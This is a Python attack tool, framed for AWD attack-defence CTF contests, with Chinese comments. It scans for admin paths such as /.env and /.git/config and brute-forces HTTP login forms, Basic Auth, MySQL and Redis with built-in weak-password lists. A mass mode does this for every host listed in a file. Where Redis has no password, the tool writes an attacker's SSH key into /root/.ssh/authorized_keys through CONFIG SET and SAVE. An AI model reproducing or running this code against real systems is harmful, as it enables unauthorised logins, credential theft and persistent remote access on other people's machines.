#!/usr/bin/env python3
"""
AWD 后台弱口令爆破工具
支持: HTTP 表单爆破, Basic Auth, MySQL/Redis/SMTP 爆破, 字典生成
"""

import requests
import re
import sys
import json
import time
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed


class BruteForcer:
    def __init__(self, target, target_type='http', timeout=5, max_workers=10):
        self.target = target
        self.target_type = target_type
        self.timeout = timeout
        self.max_workers = max_workers
        self.results = []

    # ========= 1. 密码字典 =========
    def get_password_dict(self):
        """返回常用弱密码字典"""
        return [
            'root', 'toor', 'admin', 'admin123', 'password',
            'root123', 'test', 'guest', '123456', 'qwerty',
            'abc123', '123456789', 'letmein', 'changeme',
            'awd', 'awd123', 'ctf', 'ctf123', 'hack',
            'P@ssw0rd', 'Passw0rd', 'Pass123', 'root@123',
            'admin@123', 'test123', 'guest123', '123123',
            '456456', '789789', '111111', '000000',
            'qwerty123', 'admin2024', 'admin2025', 'awd2024',
            'awd2025', 'ctf2024', 'ctf2025', 'hack123',
            'www', 'www123', 'webmaster', 'webmaster123',
            'manager', 'manager123', 'user', 'user123',
            'demo', 'demo123', 'temp', 'temp123',
            'root@2024', 'root@2025', 'admin@2024',
            # 空密码
            '', ' ',
            # 纯数字
            '1', '12', '123', '1234', '12345',
            '0', '00', '0000', '00000',
        ]

    def get_username_dict(self):
        """返回常用用户名字典"""
        return [
            'root', 'admin', 'administrator', 'guest',
            'test', 'user', 'demo', 'temp',
            'www', 'www-data', 'webmaster', 'manager',
            'oracle', 'postgres', 'mysql', 'redis',
            'ftp', 'nobody', 'ubuntu', 'deploy',
            'svn', 'git', 'mail', 'daemon',
            'backup', 'games', 'man', 'lp',
        ]

    def get_backend_paths(self):
        """返回后台常见路径"""
        return [
            '/admin', '/admin/', '/admin/index.php',
            '/admin/login.php', '/admin/login.html',
            '/backend', '/backend/', '/manage', '/manage/',
            '/manager', '/manager/', '/system', '/system/',
            '/console', '/console/', '/portal', '/portal/',
            '/login', '/login.php', '/login.html',
            '/wp-admin', '/wp-login.php',
            '/phpmyadmin', '/phpMyAdmin', '/pma',
            '/phpinfo.php', '/phpinfo',
            '/.env', '/.git/config', '/backup/',
            '/api/admin', '/api/login',
            '/cms', '/cms/', '/shop', '/shop/',
            '/member', '/member/', '/user', '/user/',
            '/uc_server', '/uc_client',
            '/dede', '/dede/', '/dede/login.php',
            '/e/admin', '/e/admin/', '/e/login.php',
            '/zabbix', '/zabbix/', '/grafana',
            '/jenkins', '/jenkins/', '/weblogic/',
        ]

    # ========= 2. HTTP 后台路径扫描 =========
    def scan_backend_paths(self):
        """扫描后台入口路径"""
        print(f"\n[*] 扫描后台路径: {self.target}")
        paths = self.get_backend_paths()
        found_paths = []

        for path in paths:
            url = self.target.rstrip('/') + path
            try:
                resp = requests.get(url, timeout=self.timeout, allow_redirects=True)
                if resp.status_code == 200 and len(resp.text) > 100:
                    print(f"  [!!!] 发现后台: {url} (状态={resp.status_code}, 长度={len(resp.text)})")
                    found_paths.append({
                        'url': url,
                        'status': resp.status_code,
                        'length': len(resp.text),
                        'title': self._extract_title(resp.text)
                    })
                elif resp.status_code in [301, 302]:
                    print(f"  [+] 路径存在 (跳转): {url} -> {resp.headers.get('Location', '?')}")
                    found_paths.append({
                        'url': url,
                        'status': resp.status_code,
                        'redirect': resp.headers.get('Location', '')
                    })
            except requests.exceptions.Timeout:
                pass
            except Exception:
                pass

        self.results.extend([{'type': 'backend_path', **fp} for fp in found_paths])
        return found_paths

    def _extract_title(self, html):
        match = re.search(r'<title[^>]*>([^<]+)</title>', html, re.IGNORECASE)
        return match.group(1).strip() if match else 'N/A'

    # ========= 3. HTTP 表单爆破 =========
    def brute_http_form(self, url, username_field='username', password_field='password'):
        """爆破 HTTP 登录表单"""
        print(f"\n[*] HTTP 表单爆破: {url}")
        usernames = self.get_username_dict()[:20]  # 限制数量
        passwords = self.get_password_dict()

        session = requests.Session()
        success = False

        for username in usernames:
            for password in passwords:
                try:
                    # 获取 CSRF Token (如果需要)
                    resp_get = session.get(url, timeout=self.timeout)
                    csrf_match = re.search(r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']', resp_get.text, re.IGNORECASE)
                    csrf_token = csrf_match.group(1) if csrf_match else None

                    data = {
                        username_field: username,
                        password_field: password,
                    }
                    if csrf_token:
                        data['csrf_token'] = csrf_token

                    resp = session.post(url, data=data, timeout=self.timeout, allow_redirects=True)

                    # 检测登录成功
                    if self._check_login_success(resp, password):
                        print(f"  [!!!] 登录成功: {username}:{password}")
                        self.results.append({
                            'type': 'http_brute',
                            'url': url,
                            'username': username,
                            'password': password,
                            'severity': 'critical'
                        })
                        success = True
                        break

                except Exception:
                    continue

                # 限速
                time.sleep(0.1)

            if success:
                break

        if not success:
            print("  [-] HTTP 表单爆破未成功")
        return success

    def _check_login_success(self, response, password=''):
        """检测登录是否成功"""
        text = response.text.lower()
        success_indicators = [
            'logout', '退出', 'dashboard', '控制台', 'welcome',
            'admin panel', 'control panel', '管理中心', '个人中心',
            'dashboard', 'home', 'index', 'main',
        ]
        fail_indicators = [
            'error', '错误', 'invalid', 'incorrect', 'failed',
            '用户名或密码', '密码错误', '登录失败',
        ]

        # 检查是否被重定向到其他页面
        if response.status_code in [301, 302]:
            location = response.headers.get('Location', '').lower()
            if 'login' not in location:
                return True

        # 检查成功标志
        if any(indicator in text for indicator in success_indicators):
            if not any(indicator in text for indicator in fail_indicators):
                return True

        # 检查 Cookie 变化 (可能设置了 session)
        if len(response.cookies) > 0:
            return True

        return False

    # ========= 4. Basic Auth 爆破 =========
    def brute_basic_auth(self, url):
        """爆破 HTTP Basic Auth"""
        print(f"\n[*] Basic Auth 爆破: {url}")
        usernames = self.get_username_dict()
        passwords = self.get_password_dict()

        for username in usernames:
            for password in passwords:
                try:
                    resp = requests.get(
                        url,
                        auth=(username, password),
                        timeout=self.timeout
                    )
                    if resp.status_code == 200:
                        print(f"  [!!!] Basic Auth 破解成功: {username}:{password}")
                        self.results.append({
                            'type': 'basic_auth_brute',
                            'url': url,
                            'username': username,
                            'password': password,
                            'severity': 'critical'
                        })
                        return True
                except Exception:
                    continue
                time.sleep(0.1)

        print("  [-] Basic Auth 爆破未成功")
        return False

    # ========= 5. MySQL 爆破 =========
    def brute_mysql(self, host, port=3306):
        """爆破 MySQL 密码"""
        print(f"\n[*] MySQL 爆破: {host}:{port}")
        try:
            import pymysql
        except ImportError:
            print("  [!] 需要安装 pymysql: pip install pymysql")
            return False

        passwords = self.get_password_dict()
        usernames = ['root', 'admin', 'test', 'user', 'guest']

        for username in usernames:
            for password in passwords:
                try:
                    conn = pymysql.connect(
                        host=host, port=port,
                        user=username, password=password,
                        connect_timeout=self.timeout
                    )
                    print(f"  [!!!] MySQL 登录成功: {username}:{password}")
                    cursor = conn.cursor()
                    cursor.execute("SELECT VERSION()")
                    version = cursor.fetchone()
                    print(f"      版本: {version}")
                    conn.close()
                    self.results.append({
                        'type': 'mysql_brute',
                        'host': host,
                        'username': username,
                        'password': password,
                        'version': str(version),
                        'severity': 'critical'
                    })
                    return True
                except pymysql.err.OperationalError as e:
                    error_code = e.args[0] if e.args else 0
                    # 1045: 密码错误, 1043: 连接失败
                    if error_code == 1045:
                        continue
                    elif error_code == 1043:
                        print(f"  [!] 无法连接: {e}")
                        return False
                except Exception as e:
                    print(f"  [!] 错误: {e}")

        print("  [-] MySQL 爆破未成功")
        return False

    # ========= 6. Redis 未授权/弱密码 =========
    def check_redis(self, host, port=6379):
        """检查 Redis 未授权访问"""
        print(f"\n[*] Redis 检查: {host}:{port}")

        # 先测试未授权访问
        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, port))
            sock.send(b'INFO server\r\n')
            response = sock.recv(4096).decode()
            sock.close()

            if 'redis_version' in response:
                print(f"  [!!!] Redis 未授权访问!")
                print(f"      信息: {response[:200]}")
                self.results.append({
                    'type': 'redis_unauthorized',
                    'host': host,
                    'port': port,
                    'severity': 'critical'
                })

                # 尝试写入 SSH 公钥
                self._redis_write_ssh_key(host, port)
                return True
        except Exception:
            pass

        # 尝试密码爆破
        passwords = self.get_password_dict()
        for password in passwords:
            try:
                import socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((host, port))
                sock.send(f'AUTH {password}\r\n'.encode())
                response = sock.recv(4096).decode()
                sock.close()

                if '+OK' in response:
                    print(f"  [!!!] Redis 密码破解: {password}")
                    self.results.append({
                        'type': 'redis_brute',
                        'host': host,
                        'port': port,
                        'password': password,
                        'severity': 'critical'
                    })
                    return True
                elif 'ERR' in response:
                    break  # 没有 ACL
            except Exception:
                continue

        print("  [-] Redis 爆破未成功")
        return False

    def _redis_write_ssh_key(self, host, port):
        """通过 Redis 未授权写 SSH 公钥"""
        print("  [*] 尝试通过 Redis 写入 SSH 公钥...")
        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))

            ssh_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7... awd@attacker\n\n"

            commands = [
                f'SET cracker: "{ssh_key}"',
                'CONFIG SET dir /root/.ssh/',
                'CONFIG SET dbfilename authorized_keys',
                'SAVE',
                'CONFIG SET dir /var/lib/redis/',
                'CONFIG SET dbfilename dump.rdb',
                'SAVE',
            ]

            for cmd in commands:
                sock.send((cmd + '\r\n').encode())
                response = sock.recv(4096).decode()
                print(f"    {cmd.split()[0]}: {response.strip()}")

            sock.close()
            print("  [+] SSH 公钥已写入 (如果 Redis 以 root 运行)")
        except Exception as e:
            print(f"  [-] Redis 写入失败: {e}")

    # ========= 7. 批量爆破 (多目标) =========
    def mass_brute(self, target_file):
        """批量爆破多个目标"""
        with open(target_file) as f:
            targets = [l.strip() for l in f if l.strip() and not l.startswith('#')]

        for target in targets:
            if ':' in target:
                host, port = target.rsplit(':', 1)
                port = int(port)
            else:
                host = target
                port = 80

            print(f"\n{'='*50}")
            print(f"[*] 目标: {host}:{port}")
            print(f"{'='*50}")

            # HTTP 服务
            if port in [80, 443, 8080, 8443]:
                scheme = 'https' if port in [443, 8443] else 'http'
                url = f"{scheme}://{host}:{port}"
                self.scan_backend_paths_for_target(url)
            elif port == 3306:
                self.brute_mysql(host, port)
            elif port == 6379:
                self.check_redis(host, port)

    def scan_backend_paths_for_target(self, url):
        """为单个目标扫描后台"""
        paths = self.get_backend_paths()
        for path in paths:
            full_url = url.rstrip('/') + path
            try:
                resp = requests.get(full_url, timeout=self.timeout)
                if resp.status_code == 200 and len(resp.text) > 100:
                    print(f"  [!!!] 发现后台: {full_url}")
                    self.results.append({
                        'type': 'backend_path',
                        'url': full_url,
                        'severity': 'high'
                    })
            except Exception:
                pass

    # ========= 结果汇总 =========
    def save_results(self, output_file='brute_results.json'):
        """保存爆破结果"""
        with open(output_file, 'w') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        print(f"\n[*] 结果已保存到 {output_file}")
        return self.results


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("用法:")
        print("  python3 brute_force.py <target> [--type http|mysql|redis]")
        print("  python3 brute_force.py <url> --form --user-field name --pass-field pwd")
        print("  python3 brute_force.py <file> --mass")
        sys.exit(1)

    target = sys.argv[1]
    target_type = 'http'
    mass_mode = False

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--type' and i + 1 < len(sys.argv):
            target_type = sys.argv[i+1]
            i += 2
        elif sys.argv[i] == '--mass':
            mass_mode = True
            i += 1
        else:
            i += 1

    forcer = BruteForcer(target, target_type=target_type)

    if mass_mode:
        forcer.mass_brute(target)
    elif target_type == 'http':
        forcer.scan_backend_paths()
    elif target_type == 'mysql':
        host, port = target.split(':') if ':' in target else (target, '3306')
        forcer.brute_mysql(host, int(port))
    elif target_type == 'redis':
        host, port = target.split(':') if ':' in target else (target, '6379')
        forcer.check_redis(host, int(port))

    forcer.save_results()
